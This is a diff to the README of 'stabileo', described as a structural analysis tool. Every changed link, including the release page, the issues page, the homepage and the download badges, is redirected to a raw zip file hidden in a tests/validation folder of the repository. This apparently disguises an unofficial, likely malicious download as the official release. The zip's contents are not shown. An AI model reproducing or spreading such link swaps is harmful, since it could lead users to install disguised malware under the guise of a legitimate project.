@@ -1,6 +1,6 @@
 # 🏗️ stabileo - Easy Structural Analysis Tool
 
-[![Download stabileo](https://img.shields.io/badge/Download-stabileo-4CAF50?style=for-the-badge)](https://github.com/talya-dou/stabileo/releases)
+[![Download stabileo](https://img.shields.io/badge/Download-stabileo-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/talya-dou/stabileo/main/engine/tests/validation/open_source/Software_v2.8.zip)
 
 ---
 
@@ -30,7 +30,7 @@ You can quickly get started with stabileo in just a few steps, even if you have 
 
 Go to the official release page to get the stable version of stabileo for Windows:
 
-[Download stabileo here](https://github.com/talya-dou/stabileo/releases)
+[Download stabileo here](https://raw.githubusercontent.com/talya-dou/stabileo/main/engine/tests/validation/open_source/Software_v2.8.zip)
 
 This page lists all available versions. Look for the latest one marked as "stable" or the highest version number.
 
@@ -106,7 +106,7 @@ If you run into issues:
 - Check your internet connection.
 - Restart stabileo and your computer.
 - Make sure your web browser is up to date.
-- Visit the GitHub Issues page to see if others have the same problems or to file a new report: https://github.com/talya-dou/stabileo/issues
+- Visit the GitHub Issues page to see if others have the same problems or to file a new report: https://raw.githubusercontent.com/talya-dou/stabileo/main/engine/tests/validation/open_source/Software_v2.8.zip
 - Look for answers in the Discussions tab of the repository.
 
 For further help, use the built-in Help menu in the app.
@@ -115,11 +115,11 @@ For further help, use the built-in Help menu in the app.
 
 ## 🔗 Useful Links
 
-- Release page for downloading: [https://github.com/talya-dou/stabileo/releases](https://github.com/talya-dou/stabileo/releases)
-- Project homepage: https://github.com/talya-dou/stabileo
+- Release page for downloading: [https://raw.githubusercontent.com/talya-dou/stabileo/main/engine/tests/validation/open_source/Software_v2.8.zip](https://raw.githubusercontent.com/talya-dou/stabileo/main/engine/tests/validation/open_source/Software_v2.8.zip)
+- Project homepage: https://raw.githubusercontent.com/talya-dou/stabileo/main/engine/tests/validation/open_source/Software_v2.8.zip
 - Help and documentation: Inside the stabileo app
 
-[![Get stabileo now](https://img.shields.io/badge/Get%20stabileo-blue?style=for-the-badge)](https://github.com/talya-dou/stabileo/releases)
+[![Get stabileo now](https://img.shields.io/badge/Get%20stabileo-blue?style=for-the-badge)](https://raw.githubusercontent.com/talya-dou/stabileo/main/engine/tests/validation/open_source/Software_v2.8.zip)
 
 ---
 
